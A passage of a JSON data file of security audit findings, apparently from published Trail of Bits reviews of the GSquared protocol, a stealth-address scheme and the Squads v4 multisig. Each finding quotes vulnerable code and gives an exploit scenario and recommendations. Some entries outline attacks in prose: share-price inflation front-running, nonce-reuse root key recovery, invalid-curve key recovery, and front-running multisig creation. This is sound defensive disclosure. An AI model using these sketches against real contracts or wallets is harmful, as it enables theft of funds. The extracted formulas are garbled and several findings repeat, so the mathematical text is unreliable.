        "body": "The migration from Gro protocol to GSquared protocol can be front-run by manipulating the share price enough that the protocol loses a large amount of funds. The GMigration contract is responsible for initiating the migration from Gro to GSquared. The G Migration.prepareMigration function will deposit liquidity into the three-pool and then attempt to deposit the 3CRV LP token into the GVault contract in exchange for G3CRV shares (gure 12.1). Note that this migration occurs on a newly deployed GVault contract that holds no assets and has no supply of shares. 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 function prepareMigration ( uint256 minAmountThreeCRV ) external onlyOwner { if (!IsGTrancheSet) { revert Errors.TrancheNotSet(); } // read senior tranche value before migration seniorTrancheDollarAmount = SeniorTranche(PWRD).totalAssets(); uint256 DAI_BALANCE = ERC20(DAI).balanceOf( address ( this )); uint256 USDC_BALANCE = ERC20(USDC).balanceOf( address ( this )); uint256 USDT_BALANCE = ERC20(USDT).balanceOf( address ( this )); // approve three pool ERC20(DAI).safeApprove(THREE_POOL, DAI_BALANCE); ERC20(USDC).safeApprove(THREE_POOL, USDC_BALANCE); ERC20(USDT).safeApprove(THREE_POOL, USDT_BALANCE); // swap for 3crv IThreePool(THREE_POOL).add_liquidity( [DAI_BALANCE, USDC_BALANCE, USDT_BALANCE], minAmountThreeCRV ); //check 3crv amount received uint256 depositAmount = ERC20(THREE_POOL_TOKEN).balanceOf( address ( this ) ); // approve 3crv for GVault ERC20(THREE_POOL_TOKEN).safeApprove( address (gVault), depositAmount); // deposit into GVault uint256 shareAmount = gVault.deposit(depositAmount, address ( this )); // approve gVaultTokens for gTranche ERC20( address (gVault)).safeApprove( address (gTranche), shareAmount); 89 90 91 92 93 94 95 96 97 98 } } Figure 12.1: The prepareMigration function in GMigration.sol#L61-98 However, this prepareMigration function call is vulnerable to a share price ination attack. As noted in this issue , the end result of the attack is that the shares (G3CRV) that the GMigration contract will receive can redeem only a portion of the assets that were originally deposited by GMigration into the GVault contract. This occurs because the rst depositor in the GVault is capable of manipulating the share price signicantly, which is compounded by the fact that the deposit function in GVault rounds in favor of the protocol due to a division in convertToShares (see TOB-GRO-11 ). Exploit Scenario Alice, a GSquared developer, calls prepareMigration to begin the process of migrating funds from Gro to GSquared. Eve notices this transaction in the public mempool, and front-runs it with a small deposit and a large token (3CRV) airdrop. This leads to a signicant change in the share price. The prepareMigration call completes, but GMigration is left with a small, insucient amount of shares because it has suered from truncation in the convertToShares function. These shares can be redeemed for only a portion of the original deposit. Recommendations Short term, perform the GSquared system deployment and protocol migration using a private relay. This will mitigate the risk of front-running the migration or price share manipulation. Long term, implement the short- and long-term recommendations outlined in TOB-GRO-11 . Additionally, implement an ERC4626Router similar to Fei protocols implementation so that a minimum-amount-out can be specied for deposit, mint, redeem, and withdraw operations. References   ERC4626RouterBase.sol ERC4626 share price ination",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Incorrect slippage calculation performed during strategy investments and divestitures ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "The incorrect arithmetic calculation for slippage tolerance during strategy investments and divestitures can lead to an increased rate of failed prot-and-loss (PnL) reports and withdrawals. The ConvexStrategy contract is tasked with investing excess funds into a meta pool to obtain yield and divesting those funds from the pool whenever necessary. Investments are done via the invest function, and divestitures for a given amount are done via the divest function. Both functions have the ability to manage the amount of slippage that is allowed during the deposit and withdrawal from the meta pool. For example, in the divest function, the withdrawal will go through only if the amount of 3CRV tokens that will be transferred out from the pool (by burning meta pool tokens) is greater than or equal to the _debt , the amount of 3CRV that needs to be transferred out from the pool, discounted by baseSlippage (gure 13.1). Thus, both sides of the comparison must have units of 3CRV. 883 884 885 886 887 888 889 890 891 892 893 894 895 896 897 898 899 900 901 902 903 function divest ( uint256 _debt , bool _slippage ) internal returns ( uint256 ) { uint256 meta_amount = ICurveMeta(metaPool).calc_token_amount( [ 0 , _debt], false ); if (_slippage) { uint256 ratio = curveValue(); if ( (meta_amount * PERCENTAGE_DECIMAL_FACTOR) / ratio < ((_debt * (PERCENTAGE_DECIMAL_FACTOR - baseSlippage)) / PERCENTAGE_DECIMAL_FACTOR) revert StrategyErrors.LTMinAmountExpected(); ) { } } Rewards(rewardContract).withdrawAndUnwrap(meta_amount, false ); return ICurveMeta(metaPool).remove_liquidity_one_coin( meta_amount, CRV3_INDEX, 904 905 } ); Figure 13.1: The divest function in ConvexStrategy.sol#L883-905 To calculate the value of a meta pool token (mpLP) in terms of 3CRV, the curveValue function is called (gure 13.2). The units of the return value, ratio , are 3CRV/mpLP. 1170 1171 1172 1173 1174 } function curveValue () internal view returns ( uint256 ) { uint256 three_pool_vp = ICurve3Pool(CRV_3POOL).get_virtual_price(); uint256 meta_pool_vp = ICurve3Pool(metaPool).get_virtual_price(); return (meta_pool_vp * PERCENTAGE_DECIMAL_FACTOR) / three_pool_vp; Figure 13.2: The curveValue function in ConvexStrategy.sol#L1170-1174 However, note that in gure 13.1, meta_amount value, which is the amount of mpLP tokens that need to be burned, is divided by ratio . From a unit perspective, this is multiplying an mpLP amount by a mpLP/3CRV ratio. The resultant units are not 3CRV. Instead, the arithmetic should be meta_amount multiplied by ratio. This would be mpLP times 3CRV/mpLP, which would result in the nal units of 3CRV. Assuming 3CRV/mpLP is greater than one, the division instead of multiplication will result in a smaller value, which increases the likelihood that the slippage tolerance is not met. The invest and divest functions are called during PnL reporting and withdrawals. If there is a higher risk for the functions to revert because the slippage tolerance is not met, the likelihood of failed PnL reports and withdrawals also increases. Exploit Scenario Alice wishes to withdraw some funds from the GSquared protocol. She calls GRouter.withdraw and with a reasonable minAmount . The GVault contract calls the ConvexStrategy contract to withdraw some funds to meet the necessary withdrawal amount. The strategy attempts to divest the necessary amount of funds. However, due to the incorrect slippage arithmetic, the divest function reverts and Alices withdrawal is unsuccessful. Recommendations Short term, in divest , multiply meta_amount by ratio . In invest , multiply amount by ratio . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "14. Potential division by zero in _calcTrancheValue ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "Junior tranche withdrawals may fail due to an unexpected division by zero error. One of the key steps performed during junior tranche withdrawals is to identify the dollar value of the tranche tokens that will be burned by calling _calcTrancheValue (gure 14.1). function _calcTrancheValue ( bool _tranche , uint256 _amount , uint256 _total 559 560 561 562 563 ) public view returns ( uint256 ) { 564 565 566 567 568 } uint256 factor = getTrancheToken(_tranche).factor(_total); uint256 amount = (_amount * DEFAULT_FACTOR) / factor; if (amount > _total) return _total; return amount; Figure 14.1: The _calcTrancheValue function in GTranche.sol#L559-568 To calculate the dollar value, the factor function is called to identify how many tokens represent one dollar. The dollar value, amount , is then the token amount provided, _amount , divided by factor . However, an edge case in the factor function will occur if the total supply of tranche tokens (junior or senior) is non-zero while the amount of assets backing those tokens is zero. Practically, this can happen only if the system is exposed to a loss large enough that the assets backing the junior tranche tokens are completely wiped. In this edge case, the factor function returns zero (gure 14.2). The subsequent division by zero in _calcTrancheValue will cause the transaction to revert. 525 526 527 528 529 function factor ( uint256 _totalAssets ) public view override returns ( uint256 ) 530 { 531 532 533 534 535 536 537 538 539 if (totalSupplyBase() == 0 ) { return getInitialBase(); } if (_totalAssets > 0 ) { return totalSupplyBase().mul(BASE).div(_totalAssets); } // This case is totalSupply > 0 && totalAssets == 0, and only occurs on system loss 540 541 } return 0 ; Figure 14.2: The factor function in GToken.sol#L525-541 It is important to note that if the system enters a state where there are no assets backing the junior tranche, junior tranche token holders would be unable to withdraw anyway. However, this division by zero should be caught in _calcTrancheValue , and the requisite error code should be thrown. Recommendations Short term, add a check before the division to ensure that factor is greater than zero. If factor is zero, throw a custom error code specically created for this situation. Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Token withdrawals from GTranche are sent to the incorrect address ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "The GTranche withdrawal function takes in a _recipient address to send the G3CRV shares to, but instead sends those shares to msg.sender (gure 15.1). 212 213 214 215 216 217 ) 218 219 220 221 { function withdraw ( uint256 _amount , uint256 _index , bool _tranche , address _recipient external override returns ( uint256 yieldTokenAmounts , uint256 calcAmount ) trancheToken.burn( msg.sender , factor, calcAmount); token.transfer( msg.sender , yieldTokenAmounts); . [...] . 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 } emit LogNewWithdrawal( msg.sender , _recipient, _amount, _index, _tranche, yieldTokenAmounts, calcAmount ); return (yieldTokenAmounts, calcAmount); Figure 15.1: The withdraw function in GTranche.sol#L219-259 Since GTranche withdrawals are performed by the GRouter contract on behalf of the user, the msg.sender and _recipient address are the same. However, a direct call to GTranche.withdraw by a user could lead to unexpected consequences. Recommendations Short term, change the destination address to _recipient instead of msg.sender . Long term, increase unit test coverage to include tests directly on GTranche and associated contracts in addition to performing the unit tests through the GRouter contract.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "16. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "body": "The GSquared Protocol contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. Security issues due to optimization bugs have occurred in the past . A medium- to high-severity bug in the Yul optimizer was introduced in Solidity version 0.8.13 and was xed only recently, in Solidity version 0.8.17 . Another medium-severity optimization bugone that caused memory writes in inline assembly blocks to be removed under certain conditions  was patched in Solidity 0.8.15. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the GSquared Protocol contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Related-nonce attacks across keys allow root key recovery ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf",
        "body": "Given multiple addresses generated by the same sender, if any two signatures with the associated private keys use the same nonce, then the recipients private root key can be recovered. Nonce reuse attacks are a known risk for single ECDSA keys, but this attack extends the vulnerability to all keys generated by a given sender. Exploit Scenario Alice uses Bobs public key to generate addresses  1 =  (  ||1 ) *  +   and  =  (  ||2 ) *  +  and deposits funds in each. Bobs corresponding private  2 keys will be   1 does not know  ||1 ) +  =  (    2   , she does know the dierence of the two: 2 =  (  ||2 ) +  and    1 or . Note that, while Alice   =  2   1 =  (  ||2 )   (  ||1 )  . As a result, she can write  2 =  1 +  .   Suppose Bob signs messages with hashes (respectively), and he uses the same nonce  2 and to transfer the funds out of   1 2  in both signatures. He will output signatures  1  1 and  1 ) (  ,  1 and ) (  ,  2 , where  = (  *  ) ,   1 =  (  1 ) +   1 , and =   2 (  2 +   1 +   )  .  Subtracting the -values gives us  1 except  are known, Alice can recover  1   2  =  (  1  , and thus 1   2  , and 2    )    . Because all the terms =  2   (  ||2 ) .  Recommendations Consider using deterministic nonce generation in any stealth-enabled wallets. This is an approach used in multiple elliptic curve digital signature schemes, and can be adapted to ECDSA relatively easily; see RFC 6979 . Also consider root key blinding. Set   =  (  ||  ) *  +  (  ||  ||\"  \" ) *    With blinding, private keys take the form   =  (  ||  ) +    (  ||  ||\"  \" )   Since the   terms no longer cancel out, Alice cannot nd , and the attack falls apart.    .  . Finally, consider using homogeneous key derivation. Set private key for Bob is then   =  (  ||  )   +       =  (  ||  ) *  +   . Because Alice does not know   . The  ,  she cannot nd  , and the attack falls apart.  References   ECDSA: Handle with Care RFC 6979: Deterministic Usage of the Digital Signature Algorithm (DSA) and Elliptic Curve Digital Signature Algorithm (ECDSA)",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "2. Limited forgeries for related keys ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf",
        "body": "If Bob signs a message for an address generated by Alice, Alice can convert it into a valid signature for another address. She cannot, however, control the hash of the message being signed, so this attack is of limited value. As with the related-nonce attack, this attack relies on Alice knowing the dierence in discrete logarithms between two addresses. Exploit Scenario Alice generates addresses  1 =  (  ||1 ) *  +   and  2  =  (  ||2 ) *  +    and deposits funds in each account. As before, Alice knows discrete logs for  1 and  , and 2   =  2   . 1   , the dierence of the Bob transfers money out of  , generating signature 2  *  -coordinate of (where  where  is the  (  ,  ) of a message   with hash , is the nonce). The signature is validated by computing  =    1 *  +    1 *  2 and verifying that the  -coordinate of   matches . Alice can convert this into a signature under for a message with hash  ' =  +   .  Verifying this signature under  , computing 1  1  becomes:  = (  +    1 )  *  +    1 *  1   1 =   *  +    1   1  *  +   1 *    1 =   *  +    1 (  1 +   ) *   1 =   *  +    1 *  2 This is the same relation that makes will be correct. (  ,  ) a valid signature on a message with hash , so   Note that Alice has no control over the value of  ' would have to nd a preimage preimages is, to date, a hard problem for SHA-256 and related functions. under the given hash function. Computing , so to make an eective exploit, she  ' of  ' Recommendations Consider root key blinding, as above. The attack relies on Alice knowing blinding prevents her from learning it.   , and root key Consider homogeneous key derivation, as above. Once again, depriving Alice of   obviates the attack completely.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Mutual transactions can be completely deanonymized ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf",
        "body": "When Alice and Bob both make stealth payments to each other, they generate the same Shared Secret #i for transaction i, which is used to derive destination keys for Bob and Alice: Symbol",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Allowing invalid public keys may enable DH private key recovery ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-ryanshea-practicalstealthaddresses-securityreview.pdf",
        "body": "Consider the following three assumptions: 1. 2. 3. Alice can add points that are not on the elliptic curve to the public key database, Bob does not verify the public key points, and Bob's scalar multiplication implementation has some specic characteristics. Assumptions 1 and 2 are currently not specied in the specication, which motivates this nding. If these assumptions hold, then Alice can recover Bob's DH key using a complicated attack, based on the CRYPTO 2000 paper by Biehl et al. and the DCC 2005 paper by Ciet et al . What follows is a rough sketch of the attack. For more details, see the reference publications, which also detail the specic characteristics for Assumption 3. Exploit Scenario Alice roughly follows the following steps: 1. Find a point  ' which is not on the curve used for ECDH, and a. b. when used in Bobs scalar multiplication, is eectively on a dierent curve  ' 2. 3. 4. with (a subgroup of) small prime order Brute-force all possible values of addresses with shared secret    ' for  (    ' || 0 ) the unique stealth address associated with     ' = (    ' )   ' .   ' . 0   <  ' , i.e.,    ' =   , and sends funds to all +  (    '|| 0 ) *  =   .     ' . This happens because Monitor all resulting addresses associated with until Bob withdraws funds from Repeat steps 13 for new points '   with dierent small prime orders '   to recover  '   .   5. Use the Chinese Remainder Theorem to recover   from   '   .  As a result, Alice can now track all stealth payments made to Bob (but cannot steal funds). To understand the complexity of this attack, it is sucient for Alice to repeat steps 13 for the rst 44 primes (numbers between 2 and 193). This requires Alice to make 3,831 payments in total (corresponding to the sum of the rst 44 primes). There is a tradeo where Alice uses fewer primes, which means that fewer transactions are needed. However, it means that Alice does not recover the full b dh . To compensate for this, Alice can brute-force the discrete logarithm of B dh guided by the partial information on b dh . Because the attack compromises anonymity for a particular user without giving access to funds, we consider this issue to have medium severity. As this is a complicated attack with various assumptions that requires Bob to access the funds from all his stealth addresses, we consider this issue to have high diculty. Recommendations The specication should enforce that public keys are validated for correctness, both when they are added to the public database and when they are used by senders and receivers. These validations should include point-on-curve checks, small-order-subgroup checks (if applicable), and point-at-innity checks. References   Dierential Fault Attacks on Elliptic Curve Cryptosystems, Biehl et al., 2000 Elliptic Curve Cryptosystems in the Presence of Permanent and Transient Faults, Ciet et al.,",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Reliance on vulnerable dependencies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf",
        "body": "Although dependency scans did not uncover a direct threat to the codebase, cargo-audit identied dependencies with known vulnerabilities. It is important to ensure that dependencies are not malicious. Problems with Rust dependencies could have a signicant eect on the system as a whole. The table below shows the output detailing the identied issues. Package Advisory Cargo.lock version Upgrade to ed25519-dalek Double public key signing function oracle attack on ed25519-dalek 1.0.1  2.0.0 h2 Resource exhaustion vulnerability in h2 may lead to denial of service (DoS) 0.3.15  0.3.17 time Potential segfault in the time crate 0.1.45  0.2.23 webpki webpki: CPU denial of service in certicate path building 0.22.0  0.22.1 ansi_term ansi_term is unmaintained 0.12.1 N/A dlopen_derive dlopen_derive is unmaintained 0.2.4 N/A atty Potential unaligned read 0.2.14 N/A borsh tokio Parsing borsh messages with ZST which are not-copy/clone is unsound 0.9.3 N/A tokio::io::ReadHalf<T>::unsplit is Unsound 1.24.1 N/A crossbeam- channel Yanked 0.5.6 0.5.8 ed25519 Yanked 1.5.2 1.5.3 Table 1.1: Vulnerabilities reported by cargo-audit Note that several of the vulnerabilities can be eliminated by simply updating the associated dependency. Exploit Scenario Mallory notices that the Squads multisig program exercises code from one of the vulnerable dependencies in table 1.1. Mallory uses the associated bug to steal funds from Alices multisig wallet. Recommendations Short term, ensure that dependencies are up to date and verify their integrity after installation. As mentioned above, several of the vulnerabilities currently aecting Squads v4s dependencies can be eliminated by simply upgrading the associated dependencies. Thus, keeping dependencies up to date can help prevent many vulnerabilities. Long term, consider integrating automated dependency auditing into the development workow. If dependencies cannot be updated when a vulnerability is disclosed, ensure that the codebase does not use it and is not aected by the vulnerable functionality of the dependency. 2. Insu\u0000cient linter use Severity: Informational Diculty: High Type: Patching Finding ID: TOB-SQUADS-2 Target: Various source les",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "3. Lack of build instructions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf",
        "body": "The Squads v4 repository contains information for verifying the deployed program, but lacks other essential information. The repositorys README should include at least the following:  Instructions for building the project  Instructions for running the built artifacts  Instructions for running the projects tests For example, running the projects Anchor tests is nontrivial. Figure 3.1 shows how the tests are run in CI: 75 76 77 78 79 80 - name: Build Program run: yarn build - name: Replace Program keypair in target/deploy run: | echo -n \"${{ secrets.MULTISIG_PROGRAM_KEYPAIR }}\" > ./target/deploy/squads_multisig_program-keypair.json 81 82 83 - name: Run Tests run: yarn test Figure 3.1: How the projects Anchor tests are run in CI (.github/workflows/reusable-tests.yaml#7583) Steps like those in gure 3.1 should be documented to help ensure that developers perform them correctly. Exploit Scenario Alice, a Solana developer, tries to build the Squads multisig program, but a mistake in her procedure causes it to behave incorrectly. Recommendations Short term, add the minimum information listed above to the repositorys README. This will help developers to build, run, and test the project. Long term, as the project evolves, ensure that the README is updated. This will help ensure that they do not communicate incorrect information to users.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Functions invariant and invalidate_prior_transactions called in wrong order ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf",
        "body": "In several places within the Squads multisig program, the invariant method is called prior to the invalidate_prior_transactions method. However, invalidate_prior_transactions modies the stale_transaction_index eld, which invariant checks. Hence, it would make more sense to call invariant after calling invalidate_prior_transactions. The denition of invalidate_prior_transactions and the relevant portion of invariant appear in gures 4.1 and 4.2, respectively. An example where this issue occurs appears in gure 4.3. 175 176 /// Makes the transactions created up until this moment stale. /// Should be called whenever any multisig parameter related to the voting consensus is changed. 177 178 179 pub fn invalidate_prior_transactions(&mut self) { self.stale_transaction_index = self.transaction_index; } Figure 4.1: Denition of invalidate_prior_transactions (programs/squads_multisig_program/src/state/multisig.rs#175179) 166 // `state.stale_transaction_index` must be less than or equal to `state.transaction_index`. require!( 167 168 169 170 stale_transaction_index <= transaction_index, MultisigError::InvalidStaleTransactionIndex ); Figure 4.2: Relevant portion of invariant (programs/squads_multisig_program/src/state/multisig.rs#166170) 79 pub fn multisig_add_member(ctx: Context<Self>, args: MultisigAddMemberArgs) -> Result<()> { 108 109 110 111 112 113 ... multisig.invariant()?; multisig.invalidate_prior_transactions(); Ok(()) } Figure 4.3: Example where invariant is called prior to invalidate_prior_transactions (programs/squads_multisig_program/src/instructions/multisig_config.rs#79 113) This issue aects the following locations:  programs/squads_multisig_program/src/instructions/multisig_config .rs#L108-L110  programs/squads_multisig_program/src/instructions/multisig_config .rs#L139-L141  programs/squads_multisig_program/src/instructions/multisig_config .rs#L159-L161  programs/squads_multisig_program/src/instructions/multisig_config .rs#L176-L178  programs/squads_multisig_program/src/instructions/multisig_config .rs#L196-L198 Note that this nding is informational since the existence of the invariant method exceeds industry norms. Exploit Scenario The invalidate_prior_transactions method is modied in a way that causes it to no longer satisfy the invariant method. The Squads multisig program is deployed with the modication. The bug might have been caught prior to deployment if the methods had been called in the reverse order. Recommendations Short term, reverse the order of the calls to invariant and invalidate_prior_transactions in all of the locations listed above. Doing so will ensure that invalidate_prior_transactionss modications of the stale_transaction_index eld preserve the invariant. Long term, as new instructions are added to the multisig program, ensure that invariant is always the last thing called. Adopting such a policy will help to prevent future code from introducing bugs. 5. Insu\u0000cient test coverage Severity: Informational Diculty: High Type: Testing Finding ID: TOB-SQUADS-5 Target: test subdirectory",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Attacker can front-run multisig creation transaction ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf",
        "body": "A multisig account is derived from an unauthenticated create_key. An attacker can front-run a users multisig creation transaction and create the multisig with their own parameters, allowing them to perform transactions from that multisig. The attacker can steal tokens from the multisig vaults if the user is unaware of the front-running and continues to use the multisig. A multisig account is a PDA derived from the key of the create_key account (gure 7.1). 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #[derive(Accounts)] #[instruction(args: MultisigCreateArgs)] pub struct MultisigCreate<'info> { #[account( init, payer = creator, space = Multisig::size(args.members.len()), seeds = [SEED_PREFIX, SEED_MULTISIG, create_key.key().as_ref()], bump )] pub multisig: Account<'info, Multisig>, /// A random public key that is used as a seed for the Multisig PDA. /// CHECK: This can be any random public key. pub create_key: AccountInfo<'info>, Figure 7.1: Accounts struct for the multisig_create instruction in (programs/squads_multisig_program/src/instructions/multisig_create.rs#20 34) The create_key account is not authenticated; any user can call the multisig_create instruction with any create_key account and initialize the corresponding multisig account. As a result, an attacker monitoring new transactions can check for multisig creation transactions and front-run these transactions by copying the create_key account and then creating the multisig account themselves. Because the attacker is creating the multisig, they can set their own values for members. The attacker could make minimal changes to the members list that go unnoticed and then perform operations on the multisig (e.g., transfer tokens from the vaults), after some activity by the original users. Exploit Scenario 1. Alice, a user of Squads protocol, tries to create a multisig. Eve creates the multisig using Alice's create_key with a modied members list. Alice notices the modication and tries to create another multisig account. However, Eve constantly front-runs Alices transactions and hinders her experience of using Squads protocol. 2. Bob, another user of Squads protocol, tries to create a multisig with threshold set to three and members to 10 keys. Eve creates the multisig using Bobs create_key with a modied members list containing three of her own keys. Bob does not notice the modication and his team continues to use the multisig. After some time, the tokens in the multisig vaults accumulate to one million USD. Eve uses her keys in the members list and steals the tokens. Recommendations Short term, check that the create_key account has signed the multisig_create instruction. This allows only the owner of the create_key to create the corresponding multisig. Long term, consider the front-running risks while determining the authentication requirements for the instructions in the program. Use negative tests to ensure the program meets those requirements.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Program uses same set of ephemeral keys for all transactions in a batch ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf",
        "body": "The same set of ephemeral keys is used for multiple transactions of a batch. As a result, the transactions may fail to execute if they require the ephemeral keys to be unique for each of the transactions. The ephemeral keys are temporary PDA accounts that sign the vault transactions. They are intended to be used as one-time keys or accounts by the transaction. For example, an ephemeral key could be used to create a mint account or a token account, as the key is not required after setting the proper authority. Because multiple accounts cannot be created using the same ephemeral account, this use case requires that ephemeral keys are unique for each of the transactions. However, for a batch transaction, which may contain multiple vault transactions, the ephemeral keys are derived from the batch transactions account key. As a result, the derived ephemeral keys will be the same for all transactions in that batch (gure 8.1). 106 107 108 /// Add a transaction to the batch. #[access_control(ctx.accounts.validate())] pub fn batch_add_transaction(ctx: Context<Self>, args: BatchAddTransactionArgs) -> Result<()> { 117 118 119 120 121 122 123 124 125 126 127 128 [...] let ephemeral_signer_bumps: Vec<u8> = (0..args.ephemeral_signers) .into_iter() .map(|ephemeral_signer_index| { let ephemeral_signer_seeds = &[ SEED_PREFIX, batch_key.as_ref(), SEED_EPHEMERAL_SIGNER, &ephemeral_signer_index.to_le_bytes(), ]; let (_, bump) = Pubkey::find_program_address(ephemeral_signer_seeds, ctx.program_id); 129 130 131 132 bump }) .collect(); Figure 8.1: A snippet of batch_add_transaction instruction in (programs/squads_multisig_program/src/instructions/batch_add_transaction. rs#106132) If two of the transactions in a batch try to create a new account using the ephemeral key, then the second transaction will fail to execute, as an account would have already been initialized under the ephemeral key by the rst transaction. Also, because the transactions in the batch are executed sequentially, the transactions after the failed transaction cannot be executed either. The users would have to create new transactions and go through the transaction approval process again to perform the operations. Exploit Scenario Bob and his team use the Squads protocol for treasury management. The team intends to deploy a new protocol. The deployment process involves successful execution of a batch transaction from the multisig, which creates new mint accounts for the program and transfers tokens from the multisig vaults to the program-owned token accounts. Bob, unaware of the issue, creates a batch such that the rst and second transactions create mint accounts using the ephemeral keys. The next ve transactions transfer tokens and handle other operations required for deployment. The batch transaction is approved by the team and Bob tries to execute each transaction after the timelock of one week. The execution of the second transaction fails and the transactions after that cannot be executed. Bob, unsure of the issue, creates regular vault transactions for the last six unexecuted transactions. The team has to approve each transaction and Bob has to execute them after the timelock. This creates a noticeable delay in the deployment of Bobs protocol. Recommendations Short term, derive the ephemeral keys using the key of the account used to store the individual transactions in the batch. Doing so will result in unique ephemeral keys for each transaction. Long term, as recommended in TOB-SQUADS-5, expand the projects tests to ensure that the program is behaving as expected for all intended use cases. 9. Ine\u0000cient lookup table account verication during transaction execution Severity: Informational Diculty: Low Type: Undened Behavior Finding ID: TOB-SQUADS-9 Target: programs/squads_multisig_program/src/utils/executable_transaction_me ssage.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Reliance on vulnerable dependencies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf",
        "body": "Although dependency scans did not uncover a direct threat to the codebase, cargo-audit identied dependencies with known vulnerabilities. It is important to ensure that dependencies are not malicious. Problems with Rust dependencies could have a signicant eect on the system as a whole. The table below shows the output detailing the identied issues. Package Advisory Cargo.lock version Upgrade to ed25519-dalek Double public key signing function oracle attack on ed25519-dalek 1.0.1  2.0.0 h2 Resource exhaustion vulnerability in h2 may lead to denial of service (DoS) 0.3.15  0.3.17 time Potential segfault in the time crate 0.1.45  0.2.23 webpki webpki: CPU denial of service in certicate path building 0.22.0  0.22.1 ansi_term ansi_term is unmaintained 0.12.1 N/A dlopen_derive dlopen_derive is unmaintained 0.2.4 N/A atty Potential unaligned read 0.2.14 N/A borsh tokio Parsing borsh messages with ZST which are not-copy/clone is unsound 0.9.3 N/A tokio::io::ReadHalf<T>::unsplit is Unsound 1.24.1 N/A crossbeam- channel Yanked 0.5.6 0.5.8 ed25519 Yanked 1.5.2 1.5.3 Table 1.1: Vulnerabilities reported by cargo-audit Note that several of the vulnerabilities can be eliminated by simply updating the associated dependency. Exploit Scenario Mallory notices that the Squads multisig program exercises code from one of the vulnerable dependencies in table 1.1. Mallory uses the associated bug to steal funds from Alices multisig wallet. Recommendations Short term, ensure that dependencies are up to date and verify their integrity after installation. As mentioned above, several of the vulnerabilities currently aecting Squads v4s dependencies can be eliminated by simply upgrading the associated dependencies. Thus, keeping dependencies up to date can help prevent many vulnerabilities. Long term, consider integrating automated dependency auditing into the development workow. If dependencies cannot be updated when a vulnerability is disclosed, ensure that the codebase does not use it and is not aected by the vulnerable functionality of the dependency.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "2. Insu\u0000cient linter use ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf",
